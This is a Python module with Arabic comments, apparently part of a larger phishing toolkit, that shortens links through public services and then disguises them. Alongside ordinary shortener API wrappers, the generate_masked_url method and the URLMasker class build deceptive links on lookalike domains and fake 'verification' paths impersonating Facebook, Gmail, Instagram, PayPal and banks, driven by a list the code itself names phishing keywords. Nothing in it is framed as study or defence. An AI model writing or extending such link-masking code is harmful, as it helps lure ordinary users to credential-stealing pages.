"""
🔗 نظام اختصار الروابط المتكامل
يدعم خدمات اختصار متعددة مع إخفاء وتقنع الروابط
"""

import aiohttp
import asyncio
import logging
import random
import string
from typing import Dict, Optional, Any
from urllib.parse import urlparse, urlencode
import json

from ..config import settings

logger = logging.getLogger(__name__)

class URLShortener:
    """مدير خدمات اختصار الروابط"""
    
    def __init__(self):
        self.session = None
        self.mask_domains = [
            'security-check.net',
            'account-verification.org', 
            'login-portal.info',
            'secure-access.net',
            'verification-required.com',
            'account-security.org',
            'login-verification.net'
        ]
    
    async def get_session(self):
        """الحصول على جلسة HTTP"""
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession()
        return self.session
    
    async def close(self):
        """إغلاق الجلسة"""
        if self.session and not self.session.closed:
            await self.session.close()
    
    async def shorten_url(self, url: str, service: str = None) -> Dict[str, Any]:
        """اختصار رابط باستخدام خدمة محددة"""
        
        if not service:
            service = settings.URL_SHORTENER
        
        try:
            if service == "tinyurl":
                return await self._shorten_tinyurl(url)
            elif service == "bitly":
                return await self._shorten_bitly(url)
            elif service == "shortio":
                return await self._shorten_shortio(url)
            elif service == "cuttly":
                return await self._shorten_cuttly(url)
            elif service == "rebrandly":
                return await self._shorten_rebrandly(url)
            elif service == "isgd":
                return await self._shorten_isgd(url)
            elif service == "vgd":
                return await self._shorten_vgd(url)
            else:
                return await self._shorten_tinyurl(url)  # افتراضي
                
        except Exception as e:
            logger.error(f"خطأ في اختصار الرابط بـ {service}: {e}")
            # محاولة التبديل لخدمة أخرى
            return await self._fallback_shortener(url, service)
    
    async def _shorten_tinyurl(self, url: str) -> Dict[str, Any]:
        """اختصار باستخدام TinyURL"""
        
        session = await self.get_session()
        api_url = "http://tinyurl.com/api-create.php"
        
        params = {'url': url}
        
        async with session.get(api_url, params=params) as response:
            if response.status == 200:
                short_url = await response.text()
                if short_url.startswith('http'):
                    return {
                        'success': True,
                        'short_url': short_url.strip(),
                        'service': 'TinyURL',
                        'original_url': url
                    }
        
        return {'success': False, 'error': 'فشل في اختصار الرابط'}
    
    async def _shorten_bitly(self, url: str) -> Dict[str, Any]:
        """اختصار باستخدام Bit.ly"""
        
        if not settings.BITLY_ACCESS_TOKEN:
            return {'success': False, 'error': 'رمز Bit.ly غير متوفر'}
        
        session = await self.get_session()
        api_url = "https://api-ssl.bitly.com/v4/shorten"
        
        headers = {
            'Authorization': f'Bearer {settings.BITLY_ACCESS_TOKEN}',
            'Content-Type': 'application/json'
        }
        
        data = {'long_url': url}
        
        async with session.post(api_url, headers=headers, json=data) as response:
            if response.status == 200:
                result = await response.json()
                return {
                    'success': True,
                    'short_url': result['link'],
                    'service': 'Bit.ly',
                    'original_url': url
                }
        
        return {'success': False, 'error': 'فشل في اختصار الرابط'}
    
    async def _shorten_shortio(self, url: str) -> Dict[str, Any]:
        """اختصار باستخدام Short.io"""
        
        if not settings.SHORTIO_API_KEY or not settings.SHORTIO_DOMAIN:
            return {'success': False, 'error': 'إعدادات Short.io غير متوفرة'}
        
        session = await self.get_session()
        api_url = "https://api.short.io/links"
        
        headers = {
            'Authorization': settings.SHORTIO_API_KEY,
            'Content-Type': 'application/json'
        }
        
        data = {
            'domain': settings.SHORTIO_DOMAIN,
            'originalURL': url
        }
        
        async with session.post(api_url, headers=headers, json=data) as response:
            if response.status == 200:
                result = await response.json()
                return {
                    'success': True,
                    'short_url': result['shortURL'],
                    'service': 'Short.io',
                    'original_url': url
                }
        
        return {'success': False, 'error': 'فشل في اختصار الرابط'}
    
    async def _shorten_cuttly(self, url: str) -> Dict[str, Any]:
        """اختصار باستخدام Cutt.ly"""
        
        if not settings.CUTTLY_API_KEY:
            return {'success': False, 'error': 'رمز Cutt.ly غير متوفر'}
        
        session = await self.get_session()
        api_url = "https://cutt.ly/api/api.php"
        
        params = {
            'key': settings.CUTTLY_API_KEY,
            'short': url
        }
        
        async with session.get(api_url, params=params) as response:
            if response.status == 200:
                result = await response.json()
                if result['url']['status'] == 7:
                    return {
                        'success': True,
                        'short_url': result['url']['shortLink'],
                        'service': 'Cutt.ly',
                        'original_url': url
                    }
        
        return {'success': False, 'error': 'فشل في اختصار الرابط'}
    
    async def _shorten_rebrandly(self, url: str) -> Dict[str, Any]:
        """اختصار باستخدام Rebrandly"""
        
        if not settings.REBRANDLY_API_KEY:
            return {'success': False, 'error': 'رمز Rebrandly غير متوفر'}
        
        session = await self.get_session()
        api_url = "https://api.rebrandly.com/v1/links"
        
        headers = {
            'apikey': settings.REBRANDLY_API_KEY,
            'Content-Type': 'application/json'
        }
        
        data = {'destination': url}
        
        if settings.REBRANDLY_DOMAIN:
            data['domain'] = {'fullName': settings.REBRANDLY_DOMAIN}
        
        async with session.post(api_url, headers=headers, json=data) as response:
            if response.status == 200:
                result = await response.json()
                return {
                    'success': True,
                    'short_url': result['shortUrl'],
                    'service': 'Rebrandly',
                    'original_url': url
                }
        
        return {'success': False, 'error': 'فشل في اختصار الرابط'}
    
    async def _shorten_isgd(self, url: str) -> Dict[str, Any]:
        """اختصار باستخدام Is.gd"""
        
        session = await self.get_session()
        api_url = "https://is.gd/create.php"
        
        params = {
            'format': 'simple',
            'url': url
        }
        
        async with session.get(api_url, params=params) as response:
            if response.status == 200:
                short_url = await response.text()
                if short_url.startswith('http'):
                    return {
                        'success': True,
                        'short_url': short_url.strip(),
                        'service': 'Is.gd',
                        'original_url': url
                    }
        
        return {'success': False, 'error': 'فشل في اختصار الرابط'}
    
    async def _shorten_vgd(self, url: str) -> Dict[str, Any]:
        """اختصار باستخدام V.gd"""
        
        session = await self.get_session()
        api_url = "https://v.gd/create.php"
        
        params = {
            'format': 'simple',
            'url': url
        }
        
        async with session.get(api_url, params=params) as response:
            if response.status == 200:
                short_url = await response.text()
                if short_url.startswith('http'):
                    return {
                        'success': True,
                        'short_url': short_url.strip(),
                        'service': 'V.gd',
                        'original_url': url
                    }
        
        return {'success': False, 'error': 'فشل في اختصار الرابط'}
    
    async def _fallback_shortener(self, url: str, failed_service: str) -> Dict[str, Any]:
        """خدمة احتياطية في حالة فشل الخدمة الأساسية"""
        
        fallback_services = ['tinyurl', 'isgd', 'vgd']
        
        for service in fallback_services:
            if service != failed_service:
                try:
                    result = await self.shorten_url(url, service)
                    if result.get('success'):
                        return result
                except Exception:
                    continue
        
        return {'success': False, 'error': 'فشل في جميع خدمات الاختصار'}
    
    def generate_masked_url(self, short_url: str, target_site: str) -> str:
        """إنشاء رابط مقنع يخفي الرابط الحقيقي"""
        
        # اختيار نطاق عشوائي
        mask_domain = random.choice(self.mask_domains)
        
        # إنشاء مسار مقنع حسب نوع الموقع
        if 'facebook' in target_site:
            path = f"/security-check/facebook-login/{self._generate_random_id()}"
        elif 'google' in target_site:
            path = f"/account-verification/gmail-security/{self._generate_random_id()}"
        elif 'instagram' in target_site:
            path = f"/verify-account/instagram-blue-tick/{self._generate_random_id()}"
        elif 'paypal' in target_site:
            path = f"/payment-security/paypal-verification/{self._generate_random_id()}"
        else:
            path = f"/secure-login/{target_site}-verification/{self._generate_random_id()}"
        
        # إنشاء معاملات URL مقنعة
        params = {
            'ref': self._generate_random_id(8),
            'token': self._generate_random_id(16),
            'redirect': short_url
        }
        
        masked_url = f"https://{mask_domain}{path}?{urlencode(params)}"
        
        return masked_url
    
    def _generate_random_id(self, length: int = 12) -> str:
        """إنشاء معرف عشوائي"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    async def get_url_stats(self, short_url: str) -> Dict[str, Any]:
        """الحصول على إحصائيات الرابط المختصر"""
        
        try:
            # محاولة الحصول على إحصائيات حسب الخدمة
            if 'bit.ly' in short_url:
                return await self._get_bitly_stats(short_url)
            elif 'rebrand.ly' in short_url:
                return await self._get_rebrandly_stats(short_url)
            else:
                return {'success': False, 'error': 'الخدمة لا تدعم الإحصائيات'}
                
        except Exception as e:
            logger.error(f"خطأ في الحصول على إحصائيات الرابط: {e}")
            return {'success': False, 'error': str(e)}
    
    async def _get_bitly_stats(self, short_url: str) -> Dict[str, Any]:
        """الحصول على إحصائيات Bit.ly"""
        
        if not settings.BITLY_ACCESS_TOKEN:
            return {'success': False, 'error': 'رمز Bit.ly غير متوفر'}
        
        # استخراج معرف الرابط من URL
        link_id = short_url.split('/')[-1]
        
        session = await self.get_session()
        api_url = f"https://api-ssl.bitly.com/v4/bitlinks/{link_id}/clicks"
        
        headers = {
            'Authorization': f'Bearer {settings.BITLY_ACCESS_TOKEN}'
        }
        
        async with session.get(api_url, headers=headers) as response:
            if response.status == 200:
                result = await response.json()
                return {
                    'success': True,
                    'clicks': result.get('link_clicks', []),
                    'service': 'Bit.ly'
                }
        
        return {'success': False, 'error': 'فشل في الحصول على الإحصائيات'}
    
    async def _get_rebrandly_stats(self, short_url: str) -> Dict[str, Any]:
        """الحصول على إحصائيات Rebrandly"""
        
        if not settings.REBRANDLY_API_KEY:
            return {'success': False, 'error': 'رمز Rebrandly غير متوفر'}
        
        session = await self.get_session()
        
        # البحث عن الرابط أولاً
        search_url = "https://api.rebrandly.com/v1/links"
        
        headers = {
            'apikey': settings.REBRANDLY_API_KEY
        }
        
        params = {'shortUrl': short_url}
        
        async with session.get(search_url, headers=headers, params=params) as response:
            if response.status == 200:
                links = await response.json()
                if links:
                    link_id = links[0]['id']
                    
                    # الحصول على الإحصائيات
                    stats_url = f"https://api.rebrandly.com/v1/links/{link_id}/clicks"
                    
                    async with session.get(stats_url, headers=headers) as stats_response:
                        if stats_response.status == 200:
                            stats = await stats_response.json()
                            return {
                                'success': True,
                                'clicks': stats,
                                'service': 'Rebrandly'
                            }
        
        return {'success': False, 'error': 'فشل في الحصول على الإحصائيات'}

class URLMasker:
    """مدير إخفاء وتقنع الروابط"""
    
    def __init__(self):
        self.phishing_keywords = {
            'facebook': ['security-check', 'account-verification', 'login-required'],
            'google': ['gmail-security', 'account-protection', 'signin-verification'],
            'instagram': ['blue-verification', 'account-verify', 'followers-boost'],
            'paypal': ['payment-security', 'account-limitation', 'verify-payment'],
            'banking': ['secure-login', 'account-security', 'verify-identity']
        }
    
    def create_social_engineering_url(self, original_url: str, target_site: str) -> str:
        """إنشاء رابط مع هندسة اجتماعية"""
        
        keywords = self.phishing_keywords.get(target_site, self.phishing_keywords['banking'])
        keyword = random.choice(keywords)
        
        # إنشاء نطاق مقنع
        fake_domains = [
            f"{target_site}-{keyword}.com",
            f"secure-{target_site}.org",
            f"{target_site}verification.net",
            f"official-{target_site}.info"
        ]
        
        domain = random.choice(fake_domains)
        
        # إنشاء مسار مقنع
        path_components = [
            'secure',
            'verification', 
            'login',
            random.choice(['en', 'us', 'secure']),
            self._generate_session_id()
        ]
        
        path = '/'.join(path_components)
        
        # معاملات مقنعة
        params = {
            'session': self._generate_session_id(),
            'redirect': original_url,
            'verify': '1',
            'secure': 'true'
        }
        
        masked_url = f"https://{domain}/{path}?{urlencode(params)}"
        
        return masked_url
    
    def _generate_session_id(self) -> str:
        """إنشاء معرف جلسة وهمي"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

# مثيلات عامة
url_shortener = URLShortener()
url_masker = URLMasker()